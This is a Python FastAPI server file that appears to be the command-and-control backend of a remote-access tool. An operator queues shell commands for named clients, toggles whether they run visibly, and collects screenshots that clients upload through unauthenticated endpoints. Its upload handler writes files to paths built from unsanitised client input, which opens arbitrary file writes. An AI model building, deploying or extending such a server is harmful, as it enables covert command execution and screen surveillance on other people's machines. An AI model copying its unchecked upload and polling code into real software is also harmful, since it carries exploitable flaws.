from fastapi import FastAPI, Body, Depends, HTTPException, Header
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import sqlite3
import base64
import os
from dotenv import load_dotenv

load_dotenv()
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")

if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")
def check_password(x_password: Optional[str] = Header(None, alias="x-password")):
    if not x_password or x_password != DASHBOARD_PASSWORD:
        raise HTTPException(status_code=401, detail="Unauthorized")
    return x_password

SCREENSHOT_DIR = "uploaded_frames"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Serve uploaded screenshots as static files at /frames/<username>/<file>
app.mount("/frames", StaticFiles(directory=SCREENSHOT_DIR), name="frames")

def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS clients (
        username TEXT PRIMARY KEY,
        cmd TEXT,
        run INTEGER DEFAULT 0,
        visible INTEGER DEFAULT 1,
        capture INTEGER DEFAULT 0,
        updated_at TEXT
    )
    """)
    conn.commit()
    conn.close()

init_db()

class CommandModel(BaseModel):
    username: str
    cmd: str
    visible: int = 1

class VisibilityModel(BaseModel):
    username: str
    visible: int

# List all clients (dashboard grid)
@app.get("/api/clients")
def get_clients(_: str = Depends(check_password)):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username, updated_at, visible FROM clients ORDER BY updated_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return [{"username": r[0], "updated_at": r[1], "visible": r[2] if r[2] is not None else 1} for r in rows]

# List frame filenames for a given username
@app.get("/api/frames/{username}")
def get_frames(username: str, _: str = Depends(check_password)):
    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if not os.path.exists(user_dir):
        return []
    files = sorted(
        [f for f in os.listdir(user_dir) if f.lower().endswith(('.png', '.jpg', '.jpeg'))],
        key=lambda f: int(''.join(filter(str.isdigit, f)) or '0')
    )
    return files

# Update visibility only (no command queued)
@app.post("/api/visibility")
def set_visibility(data: VisibilityModel, _: str = Depends(check_password)):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO clients (username, visible, updated_at)
        VALUES (?, ?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET
        visible = excluded.visible,
        updated_at = datetime('now')
    """, (data.username, data.visible))
    conn.commit()
    conn.close()
    return {"status": "success"}

# Send command
@app.post("/api/command")
def set_command(data: CommandModel, _: str = Depends(check_password)):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO clients (username, cmd, run, visible, updated_at)
        VALUES (?, ?, 1, ?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET
        cmd = excluded.cmd,
        run = 1,
        visible = excluded.visible,
        updated_at = datetime('now')
    """, (data.username, data.cmd, data.visible))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command queued"}

# Poll command and capture settings (Client-facing, no password required)
@app.get("/api/poll")
def poll_command(username: str):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    
    # Update timestamp
    cursor.execute("""
        INSERT INTO clients (username, updated_at) VALUES (?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
    """, (username,))
    conn.commit()
    
    cursor.execute("SELECT cmd, run, visible, capture FROM clients WHERE username = ?", (username,))
    row = cursor.fetchone()
    
    cmd_val = ""
    run_val = False
    visible_val = 1
    capture_val = False
    
    if row:
        cmd_val = row[0] if row[0] is not None else ""
        run_val = bool(row[1])
        visible_val = row[2] if row[2] is not None else 1
        capture_val = bool(row[3])
        
        if run_val:
            cursor.execute("UPDATE clients SET run = 0 WHERE username = ?", (username,))
            conn.commit()
            
    conn.close()
    
    return {
        "cmd": cmd_val if run_val else "",
        "run": run_val,
        "visible": visible_val,
        "capture": capture_val
    }

# Upload screenshot (Client-facing, no password required)
@app.post("/api/upload")
def upload_screenshot(data: dict = Body(...)):
    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")
    
    if not username or not filename or not image_base64:
        return {"status": "error", "message": "Missing fields"}
        
    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)
    file_path = os.path.join(client_folder, filename)
    
    try:
        # Handle both "data:image/png;base64,..." and raw base64
        if "," in image_base64:
            image_base64 = image_base64.split(",")[1]
        image_bytes = base64.b64decode(image_base64)
        with open(file_path, "wb") as f:
            f.write(image_bytes)
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)